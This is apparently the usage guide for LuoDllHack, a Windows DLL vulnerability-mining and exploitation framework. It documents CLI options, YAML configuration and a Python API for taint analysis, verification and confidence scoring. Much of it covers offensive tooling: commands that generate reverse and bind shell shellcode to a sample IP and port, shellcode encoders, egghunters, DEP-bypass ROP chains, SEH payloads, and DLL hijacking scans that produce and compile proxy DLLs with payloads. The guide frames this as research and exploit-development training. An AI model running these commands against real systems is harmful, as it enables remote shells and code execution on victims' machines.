# LuoDllHack Usage Guide

Complete command-line reference, API documentation, and configuration instructions.

## Table of Contents

- [Command Line Usage](#command-line-usage)
- [EXP Generator (exp_cli.py)](#exp-generator)
- [Configuration System](#configuration-system)
- [Programming Interface](#programming-interface)
  - [Plugin System](#plugin-system)
- [Confidence Scoring](#confidence-scoring)
- [Best Practices](#best-practices)

---

### 0day Discovery Options (v4.5.2+)

| Option | Description |
|--------|-------------|
| `--hunt` | Automated vulnerability mining (Dual analysis: Algorithm + AI) |
| `--hunt-max-steps N` | AI maximum reasoning steps (Default: 30) |
| `--hunt-focus FUNC` | Focus analysis on a specific exported function |
| `--hunt-output FORMAT` | Output format: console/json/html (Default: console) |
| `--hunt-no-ai` | Run algorithm analysis only, skip AI verification |

### 0day Analysis Examples

```bash
# Obtain signature file
cutter target.dll
aflj > functions.json

# Basic 0day analysis
python disasm_cli.py target.dll --hunt

# Detailed 0day analysis
python disasm_cli.py target.dll --hunt --hunt-max-steps 50 --hunt-output json

# Focused analysis on a specific function
python disasm_cli.py target.dll --hunt --hunt-focus VulnerableFunction

# Algorithm-only analysis (No AI)
python disasm_cli.py target.dll --hunt --hunt-no-ai

# View 0day discovery capabilities
python disasm_cli.py --info
```

## Command Line Usage

### Basic Syntax

```bash
python disasm_cli.py [target file/directory] [options]
```

### Vulnerability Mining Options

| Option | Description |
|--------|-------------|
| `--hunt` | Automated vulnerability mining (Dual analysis: Algorithm + AI) |
| `--hunt-max-steps N` | AI maximum (ReAct) steps (Default: 30) |
| `--hunt-focus FUNC` | Focus analysis on a specific exported function |
| `--hunt-output FORMAT` | Output format: console/json/html (Default: console) |
| `--hunt-no-ai` | Run algorithm analysis only, skip AI agents |

### Vulnerability Verification Options

| Option | Description |
|--------|-------------|
| `--verify ADDR TYPE` | Verify vulnerability at specified address (requires Speakeasy) |
| `--verify-func NAME` | Specify function name (used with --verify) |
| `--verify-trigger` | Attempt to generate a trigger test case |
| `--checksec` | Check binary security features (ASLR/DEP/CFG) |

### AI Analysis Options

| Option | Description |
|--------|-------------|
| `--ai-func ADDR` | Analyze function at specified address using AI |
| `--api-key KEY` | Gemini API Key (or set GEMINI_API_KEY environment variable) |

### DLL Proxy Options

| Option | Description |
|--------|-------------|
| `--proxy` | Generate proxy DLL source code |
| `--compile` | Compile proxy DLL (used with --proxy) |

### DLL Hijacking Scan Options (v4.5+)

| Option | Description |
|--------|-------------|
| `--hijack-scan` | Scan for DLL hijacking vulnerabilities |
| `--hijack-recursive` | Recursively scan subdirectories |
| `--hijack-skip-system` | Skip system-protected directories (Default: Yes) |
| `--hijack-include-system` | Include system directories |
| `--hijack-risk LEVEL` | Filter risk level: all/critical/high/medium/low |
| `--hijack-csv FILE` | Export CSV report |
| `--hijack-threads N` | Parallel threads (Default: 4) |
| `--hijack-gen` | Automatically generate hijacking PoC |
| `--hijack-payload TYPE` | PoC payload: messagebox/calc/cmd/shellcode/none |
| `--hijack-ai` | AI analysis of trigger scenarios (requires --api-key) |
| `--hijack-max N` | Maximum number of generated PoCs (Default: 5) |

### General Options

| Option | Description |
|--------|-------------|
| `-o, --output DIR` | Output directory (Default: current directory) |
| `--report FILE` | Export report to file |
| `--config FILE` | Load YAML configuration file |
| `--info` | Show capability status and dependency check |
| `-v, --version` | Show version information |

The `--info` command provides detailed status of all capabilities including 0day discovery engines:

```bash
# View capability status
python disasm_cli.py --info

# Example Output:
================================================================
     _                       ____  _ _ _   _            _
    | |   _   _  ___        |  _ \| | | | | | __ _  ___| | __
    | |  | | | |/ _ \       | | | | | | |_| |/ _` |/ __| |/ /
    | |__| |_| | (_) |      | |_| | | |  _  | (_| | (__|   <
    |_____\__,_|\___/  _____|____/|_|_|_| |_|\__,_|\___|_|\_\
                      |_____|

    Automated Vulnerability Mining & Exploitation Framework
                        v5.2.0
    [NEW] EXP Generator | Shellcode | ROP Chain | OSED Ready
================================================================


[*] Capability Status:

  Vulnerability Mining (analysis):
    taint_engine: OK
    cfg_builder: OK
    dataflow: OK
    symbolic: OK
    memory: OK

  Enhanced Analysis (enhanced):
    Bounds check detection: OK
    Sanitizer identification: OK
    Indirect call tracking: OK
    Callback function analysis: OK
    Constraint collection: OK
    Harness generation: OK

  0day Discovery Capabilities (zeroday):
    neuro_symbolic: OK
    pattern_learning: OK
    hybrid_analysis: OK

  Vulnerability Verification (verify):
    dynamic: N/A
    speakeasy: OK
    confidence: OK
    poc_validator: OK

  DLL Hijacking (dll_hijack):
    generator: OK
    compiler: OK
    validator: OK

  AI Analysis (ai):
    agent: OK
    security: OK
    analyzer: OK
```

**0day Discovery Capabilities**:

- **Neuro-Symbolic Reasoning (neuro_symbolic)**: Advanced analysis combining Neural Networks and Symbolic Execution for discovering unknown vulnerability patterns.
- **Pattern Learning (pattern_learning)**: Learns from known vulnerabilities to identify new patterns, enabling zero-shot detection.
- **Hybrid Analysis (hybrid_analysis)**: Cross-verifies vulnerability existence using Taint Analysis, Symbolic Execution, and Fuzzing to minimize false positives.

### Examples

```bash
# Check capability status
python disasm_cli.py --info

# Automated vulnerability mining
python disasm_cli.py target.dll --hunt

# Algorithm-only analysis (No AI)
python disasm_cli.py target.dll --hunt --hunt-no-ai

# Use configuration file
python disasm_cli.py target.dll --hunt --config luodllhack.yaml

# AI-enhanced analysis
python disasm_cli.py target.dll --hunt --api-key YOUR_KEY

# Verify vulnerability
python disasm_cli.py target.dll --verify 0x18001000 DOUBLE_FREE

# Security feature check
python disasm_cli.py target.dll --checksec

# Generate and compile proxy DLL
python disasm_cli.py target.dll --proxy --compile -o ./output

# DLL hijacking scan
python disasm_cli.py "C:\Program Files\App" --hijack-scan --hijack-recursive

# Scan and generate PoC
python disasm_cli.py ./app_dir --hijack-scan --hijack-gen --hijack-payload calc

# Scan high risk and export CSV
python disasm_cli.py ./dir --hijack-scan --hijack-risk high --hijack-csv report.csv
```

### Output Files

Files generated in vulnerability mining mode (`--hunt`):

| File | Description |
|------|-------------|
| `report_*.json` | Vulnerability analysis report |
| `poc_*.py` | PoC code (if enabled) |
| `harness_*.c` | Fuzzing Harness (if enabled) |

Files generated in proxy generation mode (`--proxy`):

| File | Description |
|------|-------------|
| `proxy_xxx.def` | Module definition file (Static forwarding mode) |
| `proxy_xxx_dynamic.def` | Dynamic proxy export definition (v4.5.1+) |
| `proxy_xxx_dynamic.c` | Dynamic proxy source code |
| `proxy_xxx_asm.asm` | x64 assembly trampoline |
| `build_xxx.bat` | Compilation script |

> **Note (v4.5.1)**: Dynamic proxy mode now uses DEF files for export definitions (`FuncName = _proxy_FuncName`), resolving MSVC x64 linker LNK2001 errors.

---

## EXP Generator

`exp_cli.py` is the exploit development tool for LuoDllHack, supporting all techniques required for OSED certification.

### Basic Syntax

```bash
python exp_cli.py <command> [options]
```

### Command List

| Command | Description |
|---------|-------------|
| `reverse` | Generate reverse shell shellcode |
| `bind` | Generate bind shell shellcode |
| `exec` | Generate command execution shellcode |
| `pattern` | Generate/find cyclic pattern |
| `encode` | Encode shellcode |
| `egg` | Generate egghunter |
| `rop` | Generate ROP chain |
| `seh` | Generate SEH exploit payload |
| `badchars` | Generate bad character test string |
| `hash` | Calculate API ROR13 hash |

### Shellcode Generation

#### Reverse Shell

```bash
# x86 reverse shell (348 bytes)
python exp_cli.py reverse 192.168.1.100 4444

# x64 reverse shell (490 bytes)
python exp_cli.py reverse 192.168.1.100 4444 --arch x64

# Save to file
python exp_cli.py reverse 192.168.1.100 4444 -o shellcode.bin
```

#### Bind Shell

```bash
# x86 bind shell (318 bytes)
python exp_cli.py bind 4444

# x64 bind shell (377 bytes)
python exp_cli.py bind 4444 --arch x64
```

#### Command Execution

```bash
python exp_cli.py exec "calc.exe"
python exp_cli.py exec "cmd.exe /c whoami" --arch x64
```

### Pattern Tools

```bash
# Generate 1000-byte pattern
python exp_cli.py pattern -l 1000

# Save to file
python exp_cli.py pattern -l 5000 -o pattern.txt

# Find offset (hexadecimal)
python exp_cli.py pattern -v 0x41386141

# Find offset (decimal)
python exp_cli.py pattern -v 1094205761
```

### Shellcode Encoding

```bash
# XOR encoding (default key=0xAA)
python exp_cli.py encode shellcode.bin -t xor

# Specify XOR key
python exp_cli.py encode shellcode.bin -t xor -k 0x41

# SUB encoding
python exp_cli.py encode shellcode.bin -t sub -k 0x01

# ADD encoding
python exp_cli.py encode shellcode.bin -t add -k 0x01

# Alphanumeric encoding
python exp_cli.py encode shellcode.bin -t alpha

# Unicode safe encoding
python exp_cli.py encode shellcode.bin -t unicode

# Multi-round XOR encoding
python exp_cli.py encode shellcode.bin -t multi

# Null-free encoding
python exp_cli.py encode shellcode.bin -t null_free

# Save encoded shellcode
python exp_cli.py encode shellcode.bin -t xor -o encoded.bin
```

### Egghunter Generation

```bash
# SEH method (Default, 32 bytes)
python exp_cli.py egg w00t

# NtAccessCheckAndAuditAlarm method (32 bytes)
python exp_cli.py egg w00t -m ntaccess

# IsBadReadPtr method (37 bytes)
python exp_cli.py egg w00t -m isbadreadptr

# Custom egg tag
python exp_cli.py egg PWND -o egghunter.bin
```

### ROP Chain Generation

```bash
# VirtualProtect ROP chain (DEP bypass)
python exp_cli.py rop target.dll -c virtualprotect

# VirtualAlloc ROP chain
python exp_cli.py rop target.dll -c virtualalloc

# WriteProcessMemory ROP chain
python exp_cli.py rop target.dll -c wpm

# Specify architecture
python exp_cli.py rop target.dll -c virtualprotect --arch x64

# Specify shellcode address and size
python exp_cli.py rop target.dll -c virtualprotect \
    --shellcode-addr 0x12345678 \
    --size 0x1000

# Save ROP chain
python exp_cli.py rop target.dll -c virtualprotect -o rop_chain.bin
```

### SEH Exploit

```bash
# Generate nSEH jump instruction (JMP SHORT +6)
python exp_cli.py seh --offset 1000

# Custom jump distance
python exp_cli.py seh --offset 1000 --jump 10

# Full SEH payload (requires POP-POP-RET address)
python exp_cli.py seh --offset 1000 --ppr 0x10101010

# Save payload
python exp_cli.py seh --offset 1000 --ppr 0x10101010 -o seh_payload.bin
```

### Bad Character Testing

```bash
# Generate 0x00-0xFF test string
python exp_cli.py badchars

# Save to file
python exp_cli.py badchars -o badchars.bin
```

### API Hash Calculation

```bash
# Calculate single API hash
python exp_cli.py hash LoadLibraryA

# Calculate multiple API hashes
python exp_cli.py hash LoadLibraryA GetProcAddress VirtualProtect CreateProcessA

# Common Windows API hashes
python exp_cli.py hash kernel32.dll ws2_32.dll
```

### Programming Interface

```python
from luodllhack.exploit import (
    WindowsShellcode, ShellcodeEncoder, Egghunter,
    ROPGadgetFinder, ROPChainBuilder,
    PatternGenerator, BadCharFinder,
    ASLRBypass, SEHExploit
)

# Generate reverse shell
wsc = WindowsShellcode(arch='x86')
result = wsc.reverse_shell('192.168.1.100', 4444)
print(f"Size: {result.size} bytes")
print(f"Shellcode: {result.data.hex()}")

# Encode shellcode
enc = ShellcodeEncoder()
encoded = enc.xor_encode(result.data, key=0xAA)
print(f"Encoded: {encoded.data.hex()}")

# Generate pattern
pg = PatternGenerator()
pattern = pg.create(1000)
offset = pg.offset(0x41386141)
print(f"Offset: {offset}")

# Generate egghunter
eh = Egghunter()
hunter = eh.generate(egg=b'w00t', method='seh')
print(f"Egghunter: {hunter.stub.hex()}")

# Generate ROP chain
builder = ROPChainBuilder(arch='x86')
rop_result = builder.build_virtualprotect(
    'target.dll',
    shellcode_addr=0x12345678,
    shellcode_size=0x1000
)
print(f"ROP chain: {rop_result.payload.hex()}")
```

---

## Configuration System

### Configuration File

LuoDllHack uses YAML configuration files. See [luodllhack.example.yaml](luodllhack.example.yaml) for a full example.

```yaml
# Create configuration file
cp luodllhack.example.yaml luodllhack.yaml

# Use configuration
python disasm_cli.py target.dll --hunt --config luodllhack.yaml
```

### Configuration Details

#### Taint Analysis Config

```yaml
# Maximum analysis depth (number of instructions)
# Recommended: 2000 for small DLLs, 5000-10000 for large DLLs
taint_max_depth: 3000

# Enable cross-function analysis (highly recommended)
taint_cross_function: true

# Track taint for memory locations
taint_track_memory: true
```

#### Symbolic Execution Config

```yaml
# Timeout (seconds)
symbolic_timeout: 600

# Maximum states (prevent state explosion)
# 100: Rapid, 500: Balanced, 1000+: Deep
symbolic_max_states: 500

# Enable constraint solving
symbolic_solve_constraints: true
```

#### Memory Analysis Config

```yaml
# Track pointer lifecycles
memory_track_lifecycle: true

# Detect Use-After-Free
memory_detect_uaf: true

# Detect Double-Free
memory_detect_double_free: true
```

#### Verification Config

```yaml
# Enable Speakeasy dynamic verification
verify_enable_dynamic: true

# Emulation timeout (seconds)
verify_emulation_timeout: 60
```

#### Confidence Config

```yaml
# Minimum report threshold
# 0.30: Loose, 0.45: Balanced, 0.60: Strict
confidence_min_threshold: 0.45

# Factor weights (Sum must equal 1.0)
confidence_weights:
  taint_path_exists: 0.28      # Existence of taint path
  ai_confirmed: 0.15           # AI confirmation
  dangerous_api_call: 0.15     # Dangerous API usage
  no_bounds_check: 0.12        # Missing bounds check
  indirect_call_tainted: 0.08  # Tainted indirect call
  user_input_direct: 0.07      # Directly user-controlled input
  cross_function: 0.06         # Cross-function confirmation
  arithmetic_overflow: 0.04    # Integer overflow
  no_null_check: 0.03          # Missing NULL check
  multiple_paths: 0.02         # Multiple paths reaching sink
```

#### AI Config

```yaml
# Gemini API Key (recommended to use environment variable)
# ai_api_key: "your-key"

# Model selection
ai_model: "gemini-2.0-flash"

# Maximum tokens
ai_max_tokens: 8192

# Temperature (0.0-0.1 recommended)
ai_temperature: 0.05
```

#### Output Config

```yaml
# Output directory
output_dir: "./output"

# Generate PoC code
output_poc: true

# Generate Fuzzing Harness
output_harness: true

# Generate analysis report
output_report: true
```

### Environment Variables

All configuration items can be overridden via environment variables using the rule: `LUODLLHACK_<FIELD_NAME>`

```bash
# Example
export LUODLLHACK_TAINT_MAX_DEPTH=5000
export LUODLLHACK_CONFIDENCE_MIN_THRESHOLD=0.50
export GEMINI_API_KEY=your-api-key
```

### Preset Templates

#### Rapid Scan Mode

```yaml
taint_max_depth: 1500
symbolic_max_states: 200
verify_emulation_timeout: 30
confidence_min_threshold: 0.50
```

#### Deep Analysis Mode

```yaml
taint_max_depth: 8000
symbolic_max_states: 1000
symbolic_timeout: 900
verify_emulation_timeout: 120
confidence_min_threshold: 0.35
```

#### Low False Positive Mode

```yaml
confidence_min_threshold: 0.60
verify_enable_dynamic: true
```

---

## Programming Interface

### Configuration Loading

```python
from luodllhack.core import load_config, default_config, setup_logging_from_config

# Use default configuration
config = default_config

# Load from file
config = load_config("luodllhack.yaml")

# Setup logging
setup_logging_from_config(config)
```

### Taint Analysis

```python
from luodllhack.analysis import TaintEngine
from luodllhack.core import load_config
from pathlib import Path

# Load config
config = load_config("luodllhack.yaml")

# Create engine
engine = TaintEngine(Path("target.dll"), config=config)

# Analyze a single function
paths = engine.analyze_function(
    func_addr=0x180001000,
    func_name="ProcessInput",
    max_instructions=3000  # Optional override
)

# Traverse findings
for path in paths:
    print(f"Type: {path.sink.vuln_type.name}")
    print(f"Address: 0x{path.sink.addr:x}")
    print(f"API: {path.sink.api_name}")
    print(f"Severity: {path.sink.severity}")
```

### Cross-Function Analysis

```python
from luodllhack.analysis import TaintEngine
from pathlib import Path
import pefile

# Get exported functions
pe = pefile.PE("target.dll")
exports = {}
if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name:
            exports[exp.name.decode()] = pe.OPTIONAL_HEADER.ImageBase + exp.address

# Cross-function analysis
engine = TaintEngine(Path("target.dll"))
cross_paths = engine.analyze_cross_function(exports, max_depth=5)

for path in cross_paths:
    print(f"Entry: {path.entry_func}")
    print(f"Chain: {' -> '.join(path.call_chain)}")
    print(f"Sink: {path.sink.api_name}")
```

### Vulnerability Verification

```python
from luodllhack.verify import SpeakeasyVerifier
from pathlib import Path

# Create verifier (timeout read from config)
verifier = SpeakeasyVerifier(Path("target.dll"), timeout=60)

# Verify vulnerability
result = verifier.verify(
    target_addr=0x180001050,
    vuln_type="BUFFER_OVERFLOW",
    func_name="VulnerableFunc",
    trigger=True  # Attempt to trigger
)

print(f"Verified: {result.verified}")
print(f"Confidence: {result.confidence:.0%}")
print(f"Events: {len(result.events)}")
print(f"Analysis: {result.analysis}")
```

### Confidence Scoring

```python
from luodllhack.analysis import ConfidenceScorer
from luodllhack.core import ConfidenceFactor

# Create scorer (using configured thresholds)
scorer = ConfidenceScorer(min_threshold=0.45)

# Calculate confidence
score = scorer.calculate(
    factors={
        ConfidenceFactor.TAINT_PATH_EXISTS: True,
        ConfidenceFactor.DANGEROUS_API_CALL: True,
        ConfidenceFactor.NO_BOUNDS_CHECK: True,
    },
    vuln_type=VulnType.BUFFER_OVERFLOW
)

print(f"Score: {score.total_score:.0%}")
print(f"Level: {score.level}")
print(f"Factors: {score.factors}")
```

### DLL Proxy Generation

```python
from luodllhack.dll_hijack import ProxyGenerator
from pathlib import Path

generator = ProxyGenerator()

# Generate source only
result = generator.generate(
    Path("version.dll"),
    Path("./output")
)

# Generate and compile
result = generator.generate_and_compile(
    Path("version.dll"),
    Path("./output")
)

if result['success']:
    print(f"Files: {result['files']}")
else:
    print(f"Error: {result.get('error')}")
```

#### Architecture Matching (v4.5.1)

When compiling proxy DLLs, the architecture must match the target program:

```python
from luodllhack.dll_hijack import ProxyGenerator, AutoCompiler
from pathlib import Path
import pefile

# Detect target program architecture
target_exe = Path("C:/Program Files/App/app.exe")
pe = pefile.PE(str(target_exe))
is_64bit = pe.FILE_HEADER.Machine == 0x8664  # AMD64
arch = 'x64' if is_64bit else 'x86'
pe.close()

# Compile with correct architecture
generator = ProxyGenerator()
result = generator.generate_and_compile(
    Path("winhttp.dll"),
    Path("./output"),
    arch=arch  # Specify architecture
)
```
